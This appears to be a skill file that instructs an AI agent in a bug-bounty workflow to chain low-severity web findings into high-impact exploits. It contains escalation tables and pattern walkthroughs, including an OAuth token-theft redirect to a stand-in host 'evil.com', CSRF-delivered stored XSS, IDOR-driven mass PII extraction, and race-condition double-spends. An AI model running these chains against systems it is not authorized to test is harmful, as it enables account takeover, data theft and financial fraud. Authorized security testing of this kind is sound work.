---
name: chain-findings
description: Escalate low-severity findings into reportable vulnerabilities by building exploit chains (A→B→C)
---

# Chain Findings

You are an exploit chain builder. Your job is to take low/medium-severity findings that individually aren't worth reporting and chain them into high-impact vulnerabilities.

## When to Use This Skill

- After Phase 3 of hunt, when you have findings that are individually low/medium severity
- When standard vuln testing found anomalies but nothing directly exploitable
- When you have multiple info-disclosure findings that could combine
- When a finding is in the "CONDITIONALLY VALID" table below

## Chain Building Process

### Step 1: Inventory Available Primitives

List every finding, anomaly, and observation — even "info" level:

| Primitive | Example |
|---|---|
| Open redirect | `/redirect?url=` accepts external URLs |
| Self-XSS | XSS only fires in own session/profile |
| CSRF missing | State-changing endpoint lacks CSRF token |
| Info disclosure | Internal IPs, stack traces, version info |
| Path traversal (limited) | Can read files but not /etc/passwd |
| Header injection | Can inject CRLF but no obvious impact |
| CORS misconfigured | Reflects origin but no credentials |
| Verbose errors | SQL/stack errors but no data extraction |
| Rate limit bypass | Can bypass rate limiting on specific endpoint |
| Token leak | API key or session token in URL/referrer/JS |
| Subdomain takeover | Dangling CNAME but no direct user impact |

### Step 2: Match Chains from the Escalation Table

| Low Finding | + Chain With | = Escalated Impact | Severity |
|---|---|---|---|
| Open redirect | SSRF filter | Bypass SSRF allowlist → internal access | HIGH |
| Open redirect | OAuth flow | Steal OAuth tokens via redirect_uri manipulation | CRITICAL |
| Open redirect | Login flow | Phishing with trusted domain URL | MEDIUM |
| Self-XSS | CSRF | Force victim to trigger XSS via CSRF (login CSRF + self-XSS) | HIGH |
| Self-XSS | Clickjacking | Trick victim into pasting XSS payload | MEDIUM |
| CSRF (state-change) | Privilege endpoint | CSRF on role-change = account takeover | HIGH |
| CSRF (state-change) | Password change (no old pw) | CSRF on password change = ATO | CRITICAL |
| Info disclosure (internal IP) | SSRF | Target internal services via leaked IPs | HIGH |
| Info disclosure (API key) | API access | Use leaked key for unauthorized data access | HIGH-CRITICAL |
| Info disclosure (stack trace) | Known CVE | Match framework version to exploitable CVE | HIGH |
| Path traversal (limited) | Source code read | Read config files → DB credentials | CRITICAL |
| Path traversal (limited) | JWT secret read | Read secret key → forge JWT tokens | CRITICAL |
| Header injection (CRLF) | Set-Cookie | Session fixation via injected cookie | HIGH |
| Header injection (CRLF) | XSS | Inject script via response splitting | HIGH |
| CORS misconfigured | Token in response | Steal sensitive data cross-origin | HIGH |
| Verbose SQL errors | SQLi technique | Use error info to craft working UNION/blind payload | HIGH |
| Rate limit bypass | Brute force | Credential stuffing / OTP bypass | HIGH |
| Token in URL | Referrer leak | Token sent to third-party via Referer header | MEDIUM-HIGH |
| Subdomain takeover | Cookie scope | Steal cookies scoped to parent domain | HIGH |
| Race condition | Financial | Double-spend, duplicate reward/credit | HIGH-CRITICAL |

### Step 3: Build and Test the Chain

For each potential chain:

1. **Document the chain hypothesis:**
   ```
   Finding A: [description] (severity: LOW)
   + Finding B: [description] (severity: LOW)
   = Chain: [step-by-step exploit flow]
   Expected Impact: [what attacker achieves]
   ```

2. **Test each link:**
   - Use `session_request` or `run_flow` to execute the multi-step chain
   - Each step must succeed for the chain to be valid
   - Document the exact requests and responses at each step

3. **Prove end-to-end impact:**
   - The chain must demonstrate real-world impact (data theft, ATO, privilege escalation)
   - Show the full flow from initial entry to final impact
   - A chain where step 2 is "theoretical" is NOT a valid chain

### Step 4: Verify the Chain

```
For each chain link:
1. Can the attacker trigger step 1 without user interaction? (better)
2. Does step 1 output feed directly into step 2 input?
3. Is the final impact measurably worse than any individual finding?
4. Can the full chain be reproduced reliably (>80% success rate)?
```

If YES to all → save as a single finding with the ESCALATED severity:
```
save_target_intel(domain, "findings", {
  "endpoint": "chain: step1_endpoint → step2_endpoint",
  "vulnerability_type": "chain: finding_a_type + finding_b_type",
  "status": "confirmed",
  "severity": ESCALATED_SEVERITY,
  "chain": [
    {"step": 1, "finding": "finding_a_id", "description": "...", "request": {...}},
    {"step": 2, "finding": "finding_b_id", "description": "...", "request": {...}},
  ],
  "impact": "Full chain impact description",
  "evidence": {full request/response for each step},
  "poc_request": "run_flow steps for full reproduction"
})
```

## Common Chain Patterns

### Pattern 1: Redirect → Token Theft
```
1. Find open redirect: GET /redirect?url=https://evil.com → 302
2. Insert into OAuth flow: /oauth/authorize?redirect_uri=https://target.com/redirect?url=https://evil.com
3. OAuth token sent to attacker's server via chained redirect
Impact: Account takeover via OAuth token theft
```

### Pattern 2: Info Leak → Targeted Exploit
```
1. Stack trace reveals: Spring Boot 2.3.1 (or any versioned tech)
2. Check CVE database for that version
3. Exploit known CVE with version-specific payload
Impact: RCE or data breach via known vulnerability
```

### Pattern 3: Self-XSS → CSRF → Stored XSS
```
1. Self-XSS in profile bio field (only fires for yourself)
2. CSRF on profile update (no token required)
3. Craft page that auto-submits CSRF → sets XSS payload in victim's bio
4. XSS fires when anyone views victim's profile
Impact: Stored XSS affecting all users via CSRF
```

### Pattern 4: IDOR + Info Disclosure → Mass Data Theft
```
1. IDOR on /api/users/{id} returns user profile (low: only name/email)
2. Enumerate IDs (sequential or predictable)
3. Combine with another endpoint that accepts user ID for more data
Impact: Mass PII extraction
```

### Pattern 5: Race Condition → Financial
```
1. Rate limit bypass on coupon/reward endpoint
2. Race condition on coupon redemption (no atomic check)
3. Fire 20 parallel requests → coupon applied 5x
Impact: Financial loss, unlimited discounts
```

## Conditionally Valid Findings

These findings are only reportable WITH a chain. Never submit them standalone:

| Finding | Required Chain | Without Chain |
|---|---|---|
| Self-XSS | + CSRF or clickjacking | NOT reportable |
| Open redirect (no token theft) | + OAuth/SSRF/phishing | LOW at best |
| Missing rate limit (non-auth) | + Brute force scenario | NOT reportable |
| Verbose errors | + Working exploit using the info | INFO only |
| CORS without credentials | + Sensitive data in response | NOT reportable |
| Clickjacking (generic) | + Sensitive action on page | NOT reportable |
| Missing security headers | + Active exploit leveraging absence | INFO only |
| Cookie without Secure flag | + MitM scenario with real impact | INFO only |
| Host header injection | + Cache poisoning or password reset | NOT reportable alone |
| CSRF on non-state-changing | Must change server state | NOT reportable |

## Never Chain

- Don't chain two theoretical findings ("if X were true AND Y were true")
- Don't chain findings that require different access levels you don't have
- Don't present a chain where any link requires victim to perform unlikely actions
- Don't chain findings across completely unrelated systems
